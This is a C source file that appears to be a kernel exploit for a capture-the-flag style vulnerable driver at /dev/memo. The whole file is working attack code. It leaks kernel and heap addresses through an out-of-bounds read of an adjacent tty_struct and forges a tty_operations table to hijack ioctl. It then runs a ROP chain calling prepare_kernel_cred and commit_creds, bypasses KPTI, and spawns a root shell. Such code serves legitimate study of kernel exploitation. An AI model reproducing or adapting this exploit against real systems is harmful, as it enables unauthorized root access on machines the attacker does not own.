#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>


#define KERN_BASE 0xffff880000000000

unsigned long off_prepare_kernel_cred = 0xffffffff8107bb50 - KERN_BASE; // T prepare_kernel_cred
unsigned long off_commit_creds = 0xffffffff8107b8b0 - KERN_BASE; // T commit_creds

unsigned long off_push_rcx_popfq_mov_esi_pop_rsp_ret = 0xffffffff828f300e - KERN_BASE; // : push rcx ; popfq ; mov esi, 0xe09f1421 ; pop rsp ; ret
unsigned long off_push_rbx_and_pop_rsp_rbp_ret = 0xffffffff81896aad - KERN_BASE; // : push rbx ; and byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret

unsigned long off_push_r12_add_pop_rsp_r13 = 0xffffffff8194d4e3 - KERN_BASE;
unsigned long off_pop_rdi = 0xffffffff81001268 - KERN_BASE; // : pop rdi ; ret
unsigned long off_mov_rdi_rax_rep_ret = 0xffffffff81019dcb - KERN_BASE; //: mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret

unsigned long off_pop_rcx = 0xffffffff8104c852 - KERN_BASE; // : pop rcx ; ret
unsigned long off_bypass_kpti_pop_rax_rdi_rsp_swapgs_sysret = 0xffffffff81a00106 - KERN_BASE;
unsigned long off_bypass_kpti_swapgs_ireqt = 0xffffffff81a00a45 - KERN_BASE;
unsigned long off_pop_r11 = 0xffffffff8139890b - KERN_BASE; // : pop r11 ; ret


unsigned long rflags;
unsigned long uss, ucs;
void save_state(void) {
    __asm__ volatile (
            "mov %0, cs\n\t"
            "mov %1, ss\n\t"
            "pushfq\n\t"
            "pop %2\n\t"
            : "=r"(ucs), "=r"(uss), "=r"(rflags)
            :
            :
            );
}


void shell(void) {
    system("/bin/sh");
}


int main(void) {
    int fd, i;
    int ptmx_fd;

    save_state();
    printf("[+] rflags = 0x%lx\n", rflags);

    if ((fd = open("/dev/memo", O_RDWR)) < 0) {
        perror("open");
        return 1;
    }
    // If the slub is clean, 2 continuous allocation will be adjacent
    if ((ptmx_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY)) < 0) {
        perror("open");
        return 1;
    }

    if (lseek(fd, 0x3f0, SEEK_SET) < 0) {
        perror("lseek");
        return 1;
    }

    char buf[0x1000];
    if (read(fd, buf, 0x400) < 0) {
        perror("read");
        return 1;
    }

    char *leaked = buf + 0x10;
    if (leaked[0] == 0x01 && leaked[1] == 0x54) {
        puts("[+] Leak success");
    } else {
        puts("[+] Leak failed");
        return 1;
    }

    unsigned long addr_kernel = *(unsigned long *)(leaked + 0x18) - 0x77ff81e65900;
    unsigned long addr_chunk = *(unsigned long *)(leaked + 0x38) - 0x38 - 0x400;
    printf("addr_kernel = %p\n", (void *)addr_kernel);
    printf("addr_chunk = %p\n", (void *)addr_chunk);

    unsigned long tty_operations[0x20];
    char tty_struct[0x2e0];
    unsigned long *org_tty_struct = (unsigned long *)leaked;
    memcpy(tty_struct, org_tty_struct, 24);
    memset(tty_operations, 0, sizeof(tty_operations));
    tty_operations[12] = addr_kernel + off_push_r12_add_pop_rsp_r13; // ioctl
    // tty_operations[12] = 0xdeadbeef;
    *(unsigned long *)(tty_struct + 24) = addr_chunk; // tty_operations

    unsigned long ustack[0x500], payload[0x500];
    unsigned long addr_stack = (addr_chunk + sizeof(tty_operations));
    unsigned long *stack = payload;

    *stack ++= addr_stack + 0x300; // r13
    *stack ++= addr_kernel + off_pop_rdi;
    *stack ++= 0ULL;
    *stack ++= addr_kernel + off_prepare_kernel_cred;
    *stack ++= addr_kernel + off_pop_rcx;
    *stack ++= 0ULL;
    *stack ++= addr_kernel + off_mov_rdi_rax_rep_ret;
    *stack ++= addr_kernel + off_commit_creds;
    *stack ++= addr_kernel + off_bypass_kpti_swapgs_ireqt;
    *stack ++= 0xdeadbeef; // pop rax
    *stack ++= 0xdeadbeef; // pop rdi
    *stack ++= (unsigned long)shell;
    *stack ++= ucs;
    *stack ++= rflags;
    *stack ++= (unsigned long)ustack + sizeof(ustack) - 0x8;
    *stack ++= uss;

    if (lseek(fd, 0x0, SEEK_SET) < 0) {
        perror("lseek");
        return 1;
    }

    printf("[+] Write %lu bytes\n", sizeof(tty_operations) + (stack - payload) * 8);
    memcpy(buf, tty_operations, sizeof(tty_operations));
    memcpy(buf + sizeof(tty_operations), payload, (stack - payload) * 8);
    if (write(fd, buf, sizeof(tty_operations) + (stack - payload) * 8) < 0) {
        perror("write");
        return 1;
    }

    if (lseek(fd, 0x3f0, SEEK_SET) < 0) {
        perror("lseek");
        return 1;
    }
    memcpy(buf + 0x10, tty_struct, 24 + 8);
    if (write(fd, buf, 0x10 + 0x18 + 0x8) < 0) {
        perror("write");
        return 1;
    }

    printf("[+] addr_stack = %p\n", (void *)addr_stack);
    // set rbx to addr_stack
    ioctl(ptmx_fd, addr_stack, addr_stack);

    return 0;
}
